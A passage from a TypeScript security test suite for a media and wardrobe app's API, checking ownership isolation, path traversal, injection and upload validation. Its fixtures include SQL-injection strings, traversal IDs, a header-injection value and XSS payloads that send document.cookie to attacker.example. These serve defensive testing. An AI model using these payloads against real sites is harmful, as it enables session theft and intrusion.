      `/v1/media/assets/${assetId}?variant=original`,
      `/v1/media/assets/${assetId}?variant=display&width=320`,
      `/v1/items/${garmentId}/image`,
      `/v1/items/${garmentId}`,
      `/v1/uploads/${upload.uploadId}`,
    ];
    for (const path of paths) {
      const response = await attacker.api.get(path);
      const text = await response.text();
      expect(response.status, path).toBe(404);
      expect(response.headers.get("content-type") ?? "", path).not.toMatch(/^image\//);
      expect(text, path).not.toContain(victim.userId);
      expect(text, path).not.toContain("u/");
    }
    // The lists the attacker can read contain nothing of the victim's.
    for (const path of ["/v1/media/review", "/v1/media/photos-needed", "/v1/studio"]) {
      const text = JSON.stringify(await attacker.api.json("GET", path));
      for (const id of [assetId, display.rendition_id, original.rendition_id, garmentId, victim.userId]) expect(text, path).not.toContain(id);
    }
    // The victim's own reads still work: the refusals above are about ownership.
    const own = await victim.api.get(`/v1/media/renditions/${display.rendition_id}`);
    expect(own.status).toBe(200);
    expectPrivate(own, "owner's rendition read");
    const item = await victim.api.get(`/v1/items/${garmentId}/image`);
    expect(item.status).toBe(200);
    expectPrivate(item, "owner's garment image");
    expect(item.headers.get("content-type")).toMatch(/^image\//);
  });

  it("path traversal, storage keys and hostile IDs are 'not found' (or refused), never a file and never a server error", async () => {
    const key = encodeURIComponent(original.object_key);
    const ids = [
      key,
      encodeURIComponent(`../../${original.object_key}`),
      encodeURIComponent(`${display.rendition_id}/../${original.rendition_id}`),
      "..%2F..%2F..%2Fetc%2Fpasswd",
      "%2e%2e%2f%2e%2e%2f",
      "..",
      ".",
      "%00",
      `${display.rendition_id}%00`,
      `${display.rendition_id}%20`,
      display.rendition_id.toUpperCase(),
      encodeURIComponent(`${display.rendition_id}' OR '1'='1`),
      encodeURIComponent(`x" OR user_id != "`),
      encodeURIComponent("%"),
      encodeURIComponent("*"),
      encodeURIComponent(`${victim.userId}:${display.rendition_id}`),
      "A".repeat(4000),
      "%F0%9F%91%95",
      "__proto__",
      "constructor",
    ];
    const routes = [(id: string) => `/v1/media/renditions/${id}`, (id: string) => `/v1/media/assets/${id}`, (id: string) => `/v1/items/${id}/image`, (id: string) => `/v1/studio/compositions/${id}/preview`, (id: string) => `/v1/studio/compositions/${id}`, (id: string) => `/v1/uploads/${id}`];
    for (const who of [attacker, victim]) {
      for (const route of routes) {
        for (const id of ids) {
          const path = route(id);
          const response = await who.api.get(path);
          const text = await response.text();
          expect([400, 404], `${path.slice(0, 120)} -> ${response.status}`).toContain(response.status);
          expect(response.headers.get("content-type") ?? "").not.toMatch(/^image\//);
          expect(text).not.toMatch(/SQLITE|D1_ERROR|no such column|syntax error|\bat [A-Za-z.]+ \(|\.ts:\d+/);
          expect(text).not.toContain(original.object_key);
        }
      }
    }
    // Hostile query strings on a real rendition of the owner's own.
    for (const query of ["width=160%20OR%201=1", "width=1e9", "width=-1", "width=160&width=99999", "variant=..%2Foriginal", "variant=staging"]) {
      const response = await victim.api.get(`/v1/media/assets/${assetId}?${query}`);
      expect([200, 400], query).toContain(response.status);
      if (response.status === 200) expectPrivate(response, query);
      await response.arrayBuffer();
    }
  });

  it("an outfit preview belongs to its owner: the same composition ID gives another owner nothing", async () => {
    const opening = (await victim.api.json("GET", "/v1/studio?mode=for_today")).opening as { role: string; garmentId: string }[];
    expect(opening.length).toBeGreaterThan(0);
    // The outfit includes the photographed garment, so the preview is a real rendering of the owner's own photograph.
    const slots = opening.map((s) => ({ role: s.role, garmentId: s.garmentId }));
    if (!slots.some((s) => s.garmentId === garmentId)) {
      const top = slots.findIndex((s) => s.role === "top");
      if (top >= 0) slots[top] = { role: "top", garmentId };
      else slots.push({ role: "top", garmentId });
    }
    const asked = await victim.api.json("POST", "/v1/studio/previews", { clientRequestId: `adv-preview-${crypto.randomUUID()}`, slots });
    expect(asked.manifestHash).toMatch(/^[0-9a-f]{64}$/);
    // Rendering is background work: run the scheduled sweep until the preview is rendered or has failed.
    let mine: any = null;
    for (let i = 0; i < 60; i++) {
      if (i % 10 === 0) await runCron();
      mine = await victim.api.json("GET", `/v1/studio/compositions/${asked.manifestHash}`);
      if (mine.preview?.state === "rendered" || mine.preview?.failure) break;
      await pause(100);
    }
    expect(mine.manifestHash, "the composition read names the requested composition").toBe(asked.manifestHash);
    expect(mine.preview?.state, JSON.stringify(mine.preview)).toBe("rendered");
    expect(mine.preview.sha256).toMatch(/^[0-9a-f]{64}$/);
    const layers = mine.manifest.layers as { garmentId: string | null; renditionId: string | null; imageLabel: string }[];
    for (const s of slots) expect(layers.map((l) => l.garmentId), "every slot is a layer of the manifest").toContain(s.garmentId);
    const photographed = layers.find((l) => l.garmentId === garmentId);
    expect(photographed?.imageLabel, "the photographed garment is drawn from its photograph").not.toBe("missing");
    expect(photographed?.renditionId ?? null, "the photographed garment's layer names its image").not.toBeNull();
    expect(await sql("SELECT 1 FROM media_renditions WHERE user_id = ? AND rendition_id = ? AND status = 'active'", victim.userId, photographed!.renditionId), "the layer names an active rendition of the owner's").toHaveLength(1);
    // The owner is served the rendered preview: a private PNG, the one the composition records.
    const preview = await victim.api.get(`/v1/studio/compositions/${asked.manifestHash}/preview`);
    expect(preview.status).toBe(200);
    expect(preview.headers.get("content-type")).toBe("image/png");
    expectPrivate(preview, "owner's outfit preview");
    const png = await bytesOf(preview);
    expect([...png.subarray(0, 8)], "the preview is a PNG file").toEqual([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    expect(await sha256(png), "the preview served is the one the composition records").toBe(mine.preview.sha256);
    for (const path of [`/v1/studio/compositions/${asked.manifestHash}`, `/v1/studio/compositions/${asked.manifestHash}/preview`]) {
      const response = await attacker.api.get(path);
      expect(response.status, path).toBe(404);
      expect(response.headers.get("content-type") ?? "").not.toMatch(/^image\//);
      expect(await response.text()).not.toContain(victim.userId);
    }
    // The attacker cannot have the victim's garments composed into a preview of their own either.
    const stolen = await attacker.api.post("/v1/studio/previews", { clientRequestId: `adv-preview-${crypto.randomUUID()}`, slots });
    expect(stolen.status).toBeGreaterThanOrEqual(400);
    expect(await sql("SELECT 1 FROM outfit_composites WHERE user_id = ?", attacker.userId)).toEqual([]);
  });
});

describe("uploads: what is stored is what the bytes are", () => {
  const html = `<!doctype html><html><body><script>fetch("https://attacker.example/steal?c="+document.cookie)</script></body></html>`;
  const svg = `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><script>alert(1)</script></svg>`;

  it("refuses content types that are not photographs before anything is authorized", async () => {
    for (const contentType of ["image/svg+xml", "text/html", "image/gif", "application/octet-stream", "image/png; charset=utf-8", "IMAGE/PNG", "image/png\r\nX-Injected: 1", ""]) {
      const response = await victim.api.post("/v1/uploads", { clientUploadId: `adv-upload-${crypto.randomUUID()}`, intent: "attachment", contentType, byteLength: 1000 });
      expect(response.status, contentType).toBe(400);
    }
    for (const byteLength of [0, -1, 1.5, 21 * 1024 * 1024, Number.MAX_SAFE_INTEGER]) {
      const response = await victim.api.post("/v1/uploads", { clientUploadId: `adv-upload-${crypto.randomUUID()}`, intent: "attachment", contentType: "image/png", byteLength });
      expect(response.status, `byteLength ${byteLength}`).toBe(400);
    }
    // A garment photo for another owner's garment cannot be authorized.
    const foreign = await attacker.api.post("/v1/uploads", { clientUploadId: `adv-upload-${crypto.randomUUID()}`, intent: "garment_photo", garmentId, contentType: "image/png", byteLength: 1000 });
    expect(foreign.status).toBe(404);
  });

  it("a non-image, an HTML file and an SVG with script sent as image/png are refused and leave nothing behind", async () => {
    const assetsBefore = (await sql("SELECT COUNT(*) AS n FROM media_assets WHERE user_id = ?", victim.userId))[0]!.n;
    const pngMagic = new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10]);
    const bodies: [string, Uint8Array][] = [
      ["plain text", encoder.encode("this is not an image".padEnd(400, "."))],
      ["an HTML file", encoder.encode(html)],
      ["an SVG with script", encoder.encode(svg)],
      ["HTML behind the PNG signature", new Uint8Array([...pngMagic, ...encoder.encode(html)])],
      ["a JPEG sent as PNG", photo],
      ["a GIF header", encoder.encode("GIF89a" + "\u0001\u0000\u0001\u0000".padEnd(200, "\u0000"))],
      ["a ZIP", new Uint8Array([0x50, 0x4b, 0x03, 0x04, ...new Uint8Array(200)])],
    ];
    for (const [what, bytes] of bodies) {
      const upload = await authorize(victim, { byteLength: bytes.length });
      const response = await put(upload.url, bytes, upload.requiredHeaders);
      expect(response.status, what).toBe(400);
      expect(await staged(victim, upload.uploadId), what).toBe(false);
      const complete = await victim.api.post(`/v1/uploads/${upload.uploadId}/complete`, {});
      const body = (await complete.json()) as any;
      expect(complete.status === 200 ? body.state : "refused", what).not.toBe("finalized");
      expect(body.asset ?? null, what).toBeNull();
      expect(["authorized", "rejected", "expired"], what).toContain((await victim.api.json("GET", `/v1/uploads/${upload.uploadId}`)).state);
    }
    expect((await sql("SELECT COUNT(*) AS n FROM media_assets WHERE user_id = ?", victim.userId))[0]!.n).toBe(assetsBefore);
  });

  it("a polyglot (a real PNG with a script appended) is only ever an image: typed, sandboxed, and the payload is not in the derived copy", async () => {
    const png = testPng(110, 110);
    const payload = encoder.encode(`<script>document.location="https://attacker.example/?"+document.cookie</script>`);
    const polyglot = new Uint8Array([...png, ...payload]);
    const upload = await authorize(victim, { byteLength: polyglot.length });
    const response = await put(upload.url, polyglot, upload.requiredHeaders);
    if (response.status !== 200) {
      // Refusing it outright is the stricter answer.
      expect(response.status).toBe(400);
      expect(await staged(victim, upload.uploadId)).toBe(false);
      return;
    }
    const complete = await victim.api.json("POST", `/v1/uploads/${upload.uploadId}/complete`, {});
    expect(complete.state).toBe("finalized");
    const polyglotAsset = complete.asset.assetId as string;
    await settleMedia(victim, polyglotAsset);
    for (const path of [`/v1/media/assets/${polyglotAsset}`, `/v1/media/assets/${polyglotAsset}?variant=original`, ...(await renditionsOf(victim, polyglotAsset)).map((r) => `/v1/media/renditions/${r.rendition_id}`)]) {
      const served = await victim.api.get(path);
      expect(served.status, path).toBe(200);
      expect(served.headers.get("content-type"), path).toMatch(/^image\/(png|jpeg|webp)$/);
      expect(served.headers.get("content-disposition") ?? "inline", path).toMatch(/^(inline|attachment)/);
      expectPrivate(served, path);
      await served.arrayBuffer();
    }
    const derived = (await renditionsOf(victim, polyglotAsset)).filter((r) => r.kind !== "original");
    expect(derived.length).toBeGreaterThan(0);
    for (const r of derived) {
      const link = tokenOf((await victim.api.json("POST", `/v1/media/renditions/${r.rendition_id}/sign`, {})).url);
      const served = await signed(link);
      expectPrivate(served, "signed link to the derived copy");
      expect(containsBytes(await bytesOf(served), payload), `${r.kind} rendition carries the appended script`).toBe(false);
    }
    await submit(victim, "media.delete_asset", { assetId: polyglotAsset });
  });

  it("more bytes than were authorized are refused, and nothing of them is kept", async () => {
    const small = testPng(96, 96);
    const large = testPng(200, 200);
    expect(large.length).toBeGreaterThan(small.length);
    const upload = await authorize(victim, { byteLength: small.length });
    expect(upload.maxBytes).toBe(small.length);
    const tooBig = await put(upload.url, large, upload.requiredHeaders);
    expect(tooBig.status).toBe(400);
    expect(await staged(victim, upload.uploadId)).toBe(false);
    // One byte over is still over.
    const oneOver = await put(upload.url, new Uint8Array([...small, 0]), upload.requiredHeaders);
    expect(oneOver.status).toBe(400);
    expect(await staged(victim, upload.uploadId)).toBe(false);
    // A streamed body with no declared length is counted while it is read.
    const stream = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(large.subarray(0, 4000));
        controller.enqueue(large.subarray(4000));
        controller.close();
      },
    });
    const streamed = await SELF.fetch(`${APP_ORIGIN}${upload.url}`, { method: "PUT", headers: upload.requiredHeaders, body: stream, duplex: "half" } as RequestInit);
    expect(streamed.status).toBeGreaterThanOrEqual(400);
    expect(await staged(victim, upload.uploadId)).toBe(false);
    expect((await victim.api.json("GET", `/v1/uploads/${upload.uploadId}`)).state).toBe("authorized");
    // The authorized size itself is accepted, so the refusals were about size.
    expect((await put(upload.url, small, upload.requiredHeaders)).status).toBe(200);
  });

  it("a second PUT to a completed upload changes nothing", async () => {
    const first = testPng(100, 100);
    const upload = await authorize(victim, { byteLength: first.length });
    expect((await put(upload.url, first, upload.requiredHeaders)).status).toBe(200);
    const complete = await victim.api.json("POST", `/v1/uploads/${upload.uploadId}/complete`, {});
    expect(complete.state).toBe("finalized");
    const before = await renditionsOf(victim, complete.asset.assetId);

    const other = testPng(100, 100).map((b, i) => (i > 200 && i < 260 ? b ^ 0xff : b));
    const again = await put(upload.url, other, upload.requiredHeaders);
    expect([403, 409, 412]).toContain(again.status);
    // The bytes of the first PUT may still be waiting for the normalization job; the second PUT's bytes are nowhere.
    const waiting = await bindings().MEDIA_BUCKET!.get(`u/${victim.userId}/staging/${upload.uploadId}`);
    if (waiting) expect(await sha256(new Uint8Array(await waiting.arrayBuffer()))).toBe(await sha256(first));
    const replay = await victim.api.json("POST", `/v1/uploads/${upload.uploadId}/complete`, {});
    expect(replay.asset.assetId).toBe(complete.asset.assetId);
    const after = await renditionsOf(victim, complete.asset.assetId);
    expect(after.find((r) => r.kind === "original")!.sha256).toBe(await sha256(first));
    expect(after.filter((r) => r.kind === "original")).toHaveLength(before.filter((r) => r.kind === "original").length);
    expect((await sql("SELECT COUNT(*) AS n FROM media_assets WHERE user_id = ? AND upload_id = ?", victim.userId, upload.uploadId))[0]!.n).toBe(1);
    await submit(victim, "media.delete_asset", { assetId: complete.asset.assetId });
  });

  it("another owner cannot complete, read or write an upload, with their own session or their own upload token", async () => {
    const bytes = testPng(96, 96);
    const upload = await authorize(victim, { byteLength: bytes.length });
    const theirs = await authorize(attacker, { byteLength: bytes.length });
    const theirToken = new URL(`${APP_ORIGIN}${theirs.url}`).searchParams.get("token")!;
    const victimToken = new URL(`${APP_ORIGIN}${upload.url}`).searchParams.get("token")!;

    expect((await attacker.api.get(`/v1/uploads/${upload.uploadId}`)).status).toBe(404);
    expect((await attacker.api.post(`/v1/uploads/${upload.uploadId}/complete`, {})).status).toBe(404);
    // The attacker's genuine token names the attacker's upload: it does not open the victim's.
    const crossed = await put(`/v1/uploads/${upload.uploadId}/content?token=${theirToken}`, bytes, upload.requiredHeaders);
    expect(crossed.status).toBe(403);
    expect(await staged(victim, upload.uploadId)).toBe(false);
    // And the victim's token does not write into the attacker's upload ID either.
    expect((await put(`/v1/uploads/${theirs.uploadId}/content?token=${victimToken}`, bytes, upload.requiredHeaders)).status).toBe(403);
    expect(await staged(attacker, theirs.uploadId)).toBe(false);

    // The victim's bytes arrive; the attacker still cannot complete or see the upload, and no asset appears for the attacker.
    expect((await put(upload.url, bytes, upload.requiredHeaders)).status).toBe(200);
    expect((await attacker.api.post(`/v1/uploads/${upload.uploadId}/complete`, {})).status).toBe(404);
    expect((await victim.api.json("GET", `/v1/uploads/${upload.uploadId}`)).state).toBe("authorized");
    expect(await sql("SELECT 1 FROM media_assets WHERE user_id = ? AND upload_id = ?", attacker.userId, upload.uploadId)).toEqual([]);
    expect((await mediaKeys(`u/${attacker.userId}/staging/${upload.uploadId}`)).length).toBe(0);
    // A client-chosen upload ID equal to the victim's does not collide across owners.
    const sameId = await submit(attacker, "media.authorize_upload", { uploadId: upload.uploadId, intent: "attachment", contentType: "image/png", byteLength: bytes.length });
    if (sameId.status === 200) {
      expect((await sql("SELECT user_id FROM media_uploads WHERE upload_id = ? ORDER BY user_id", upload.uploadId)).map((r) => r.user_id).sort()).toEqual([attacker.userId, victim.userId].sort());
      expect((await victim.api.json("GET", `/v1/uploads/${upload.uploadId}`)).state).toBe("authorized");
    }
    const finished = await victim.api.json("POST", `/v1/uploads/${upload.uploadId}/complete`, {});
    expect(finished.state).toBe("finalized");
    expect((await sql("SELECT user_id FROM media_assets WHERE asset_id = ?", finished.asset.assetId)).map((r) => r.user_id)).toEqual([victim.userId]);
    await submit(victim, "media.delete_asset", { assetId: finished.asset.assetId });
  });

  it("the upload target needs its token and its declared type; a changed token writes nothing", async () => {
    const bytes = testPng(96, 96);
    const upload = await authorize(victim, { byteLength: bytes.length });
    const token = new URL(`${APP_ORIGIN}${upload.url}`).searchParams.get("token")!;
    const base = `/v1/uploads/${upload.uploadId}/content`;
    const attempts: [string, Promise<Response>, number[]][] = [
      ["no token", put(base, bytes, upload.requiredHeaders), [401]],
      ["an empty token", put(`${base}?token=`, bytes, upload.requiredHeaders), [401, 403]],
      ["a changed token", put(`${base}?token=${token.slice(0, -3)}AAA`, bytes, upload.requiredHeaders), [403]],
      ["a session instead of the token", victim.api.request("PUT", base, { raw: bytes as BodyInit, headers: upload.requiredHeaders }), [401]],
      ["no content type", put(upload.url, bytes, {}), [400]],
      ["another image type", put(upload.url, bytes, { "content-type": "image/jpeg" }), [400]],
      ["text/html", put(upload.url, bytes, { "content-type": "text/html" }), [400]],
      ["an empty body", put(upload.url, new Uint8Array(0), upload.requiredHeaders), [400]],
      ["POST instead of PUT", SELF.fetch(`${APP_ORIGIN}${upload.url}`, { method: "POST", headers: upload.requiredHeaders, body: bytes as BodyInit }), [404, 405]],
    ];
    for (const [what, pending, allowed] of attempts) {
      const response = await pending;
      expect(allowed, `${what} -> ${response.status}`).toContain(response.status);
      expect(await staged(victim, upload.uploadId), what).toBe(false);
      await response.arrayBuffer();
    }
    expect((await victim.api.json("GET", `/v1/uploads/${upload.uploadId}`)).state).toBe("authorized");
    // Completing an upload that received no bytes stores nothing.
    const complete = await victim.api.post(`/v1/uploads/${upload.uploadId}/complete`, {});
    expect(complete.status).toBeGreaterThanOrEqual(400);
    expect(await sql("SELECT 1 FROM media_assets WHERE user_id = ? AND upload_id = ?", victim.userId, upload.uploadId)).toEqual([]);
  });

  it("a client cannot declare where an image came from, mark it a demo on a real garment, or record pipeline results", async () => {
    // Extra fields on the upload route are not honoured.
    const upload = await authorize(victim, { intent: "garment_photo", garmentId, byteLength: 1000, origin: "drive_import", originRef: "SYNTHETIC forged provenance", demo: true, uploadId: "upl_forged_by_client", userId: attacker.userId });
    const row = (await sql("SELECT user_id, origin, origin_ref, is_demo FROM media_uploads WHERE upload_id = ?", upload.uploadId))[0]!;
    expect(row).toMatchObject({ user_id: victim.userId, origin: "owner_upload", origin_ref: null, is_demo: 0 });
    expect(await sql("SELECT 1 FROM media_uploads WHERE upload_id = 'upl_forged_by_client'")).toEqual([]);

    // The typed command refuses a declared provenance and a demo placeholder on a real garment.
    for (const payload of [
      { intent: "garment_photo", garmentId, contentType: "image/png", byteLength: 1000, origin: "image_model", originRef: "SYNTHETIC forged" },
      { intent: "garment_photo", garmentId, contentType: "image/png", byteLength: 1000, origin: "drive_import", originRef: "SYNTHETIC forged" },
      { intent: "garment_photo", garmentId, contentType: "image/png", byteLength: 1000, demo: true },
    ]) {
      const result = await submit(victim, "media.authorize_upload", payload);
      expect(result.status, JSON.stringify(payload)).toBe(403);
    }
    expect(await sql("SELECT 1 FROM media_uploads WHERE user_id = ? AND (origin != 'owner_upload' OR is_demo != 0)", victim.userId)).toEqual([]);

    // Pipeline results are the service's to record: an owner session (and so a stolen one) cannot write them.
    const before = await renditionsOf(victim, assetId);
    for (const [type, payload] of [
      ["media.record_normalization", { assetId, jobId: "job_forged", outcome: "normalized", renditions: [], fidelity: [], note: null }],
      ["media.record_discovery", { garmentId, jobId: "job_forged", attempts: [], candidates: [] }],
      ["media.complete_job", { jobId: "job_forged" }],
      ["media.fail_job", { jobId: "job_forged", error: "forged" }],
      ["media.apply_retention", { assetIds: [assetId] }],
      ["media.expire_uploads", { uploadIds: [upload.uploadId] }],
    ] as const) {
      const result = await submit(victim, type, payload as Record<string, unknown>);
      expect([400, 403], `${type} -> ${result.status}`).toContain(result.status);
    }
    expect(await renditionsOf(victim, assetId)).toEqual(before);
    expect((await victim.api.json("GET", `/v1/uploads/${upload.uploadId}`)).state).toBe("authorized");
  });
});
